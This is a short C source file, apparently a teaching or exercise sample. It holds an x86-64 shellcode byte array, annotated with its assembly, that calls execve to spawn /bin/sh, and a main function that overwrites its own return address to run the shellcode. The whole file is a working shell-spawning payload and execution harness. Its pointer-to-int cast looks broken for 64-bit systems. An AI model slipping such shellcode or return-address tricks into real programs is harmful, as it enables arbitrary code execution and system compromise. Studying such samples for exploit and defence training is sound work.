char shellcode[] =
    "\xeb\x17"             // jmp    617 <push_string>
    "\x5f"                 // pop    %rdi
    "\x48\x31\xd2"         // xor    %rdx,%rdx
    "\x48\x31\xc0"         // xor    %rax,%rax
    "\x48\x89\xe6"         // mov    %rsp,%rsi
    "\x48\x89\x54\x24\x08" // mov    %rdx,0x8(%rsp)
    "\x48\x89\x3c\x24"     // mov    %rdi,(%rsp)
    "\xb0\x3b"             // mov    $0x3b,%al
    "\x0f\x05"             // syscall
    "\xe8\xe4\xff\xff\xff" // callq  600 <pop_string>
    "/bin/sh";

int main(void) {
  int *ret;
  ret = (int *) &ret + 4;
  (*ret) = (int) shellcode;
}